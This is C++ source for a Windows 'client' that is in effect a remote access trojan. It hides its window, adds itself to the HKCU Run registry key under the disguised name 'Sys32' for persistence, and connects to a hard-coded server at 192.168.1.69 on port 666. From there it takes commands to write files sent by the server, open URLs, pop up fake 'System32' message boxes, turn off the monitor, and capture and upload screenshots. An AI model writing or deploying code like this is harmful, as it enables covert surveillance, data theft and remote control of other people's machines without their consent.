//Client
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string>
#include <iostream>
#include <winsock2.h>
#include <direct.h>
#include <windows.h>
#include <gdiplus.h>

#define PORT 666
#define SERVERADDR "192.168.1.69"
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "GdiPlus.lib")

static const GUID png =
{ 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };

using namespace std;

int main(int argc, char* argv[])
{
	//
	//HWND hWnd = GetConsoleWindow();
	//ShowWindow(hWnd, SW_HIDE);
	while (1){
	char buffer2[256] = "";
	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
	char dir[FILENAME_MAX];
	_getcwd(dir, sizeof(dir));
	char temp[] = "\\C.exe";
	cout << temp << " " << dir;

	strcat_s(dir, temp);
	cout << dir << endl;
	DWORD dwtype = 0;
	DWORD dwBufsize = sizeof(dir);
	TCHAR szpath[MAX_PATH];
	HKEY hKeys;
	if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL))
	{
		RegSetValueEx(hKeys, "Sys32", 0, REG_SZ, reinterpret_cast<const BYTE*>(&buffer2), sizeof(buffer2));
		RegCloseKey(hKeys);
	}
	//
	setlocale(LC_ALL, "rus");
	char buff[1024];
	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
		buff[i] = '\0';
	}
	//printf("TCP DEMO CLIENT\n");


	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
	{
		printf("WSAStart error %d\n", WSAGetLastError());
		return -1;
	}

	SOCKET my_sock;
	my_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (my_sock < 0)
	{
		printf("Socket() error %d\n", WSAGetLastError());
		system("pause");
		return -1;
	}

	sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(PORT);
	HOSTENT *hst;


	if (inet_addr(SERVERADDR) != INADDR_NONE)
		dest_addr.sin_addr.s_addr = inet_addr(SERVERADDR);
	else
	{

		if (hst = gethostbyname(SERVERADDR))

			((unsigned long *)&dest_addr.sin_addr)[0] =
			((unsigned long **)hst->h_addr_list)[0][0];
		else
		{
			printf("Invalid address %s\n", SERVERADDR);
			closesocket(my_sock);
			WSACleanup();
			system("pause");
			return -1;
		}
	}

	if (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr)))
	{
		printf("Connect error %d\n", WSAGetLastError());
		while (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))) {
			Sleep(5000);
			if (!(connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))))break;
		}
	}

	printf("Connected to %s\n", SERVERADDR);


	int nsize;
	while ((nsize = recv(my_sock, &buff[0], sizeof(buff) - 1, 0)) != SOCKET_ERROR)
	{

		buff[nsize] = 0;

		//printf("Server => Client:%s", buff);

		if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 's')) {
			//std::cout << "Принимаю файл\n";
			HANDLE hFile;
			std::string result = buff + 4;
			hFile = CreateFile(result.c_str(),  // имя файла
				GENERIC_WRITE,
				0,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			DWORD dwBytesWritten;
			while (1) {
				char buff[1028] = "";
				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
				if ((buff[0] == '@') && (buff[1] == '@') && (buff[2] == '^'))break;
				WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
				if (nbytes == 0) {
					break;
				}
				if (nbytes < 0)
				{
					break;
				}
			}
			CloseHandle(hFile);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'o')) {
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'w')) {
			std::string url = buff + 4;
			ShellExecute(NULL, "open", url.c_str(), 0, 0, SW_SHOWNORMAL);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'e')) {
			return 0;
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
			std::string result = buff + 4;
			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
			using namespace Gdiplus;
			GdiplusStartupInput gdiplusStartupInput;
			ULONG_PTR gdiplusToken;
			GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

			HDC scrdc, memdc;
			HBITMAP membit;
			scrdc = GetDC(0);
			int Height, Width;
			Height = GetSystemMetrics(SM_CYSCREEN);
			Width = GetSystemMetrics(SM_CXSCREEN);
			memdc = CreateCompatibleDC(scrdc);
			membit = CreateCompatibleBitmap(scrdc, Width, Height);
			SelectObject(memdc, membit);
			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
			HBITMAP hBitmap;
			hBitmap = (HBITMAP)SelectObject(memdc, membit);
			Gdiplus::Bitmap bitmap(hBitmap, NULL);
			bitmap.Save(L"screen.png", &png);
			DeleteObject(hBitmap);
			FILE *in1;
			fopen_s(&in1, "screen.png", "rb");
			while (!feof(in1)) {
				char bufer[1024] = "";
				int b = fread(bufer, 1, sizeof(bufer), in1);
				int size = ftell(in1);
				if (b != 0) send(my_sock, bufer, b, 0);
			}
			Sleep(6000);
			send(my_sock, "@@^", 3, 0);
			fclose(in1);
			remove("screen.png");
			std::cout << MessageBox(NULL,"del", "System32", MB_OK | MB_ICONWARNING);

		}
	}
	//printf("Recv error %d\n", WSAGetLastError());
	closesocket(my_sock);
	WSACleanup();
}
	return 0;
}
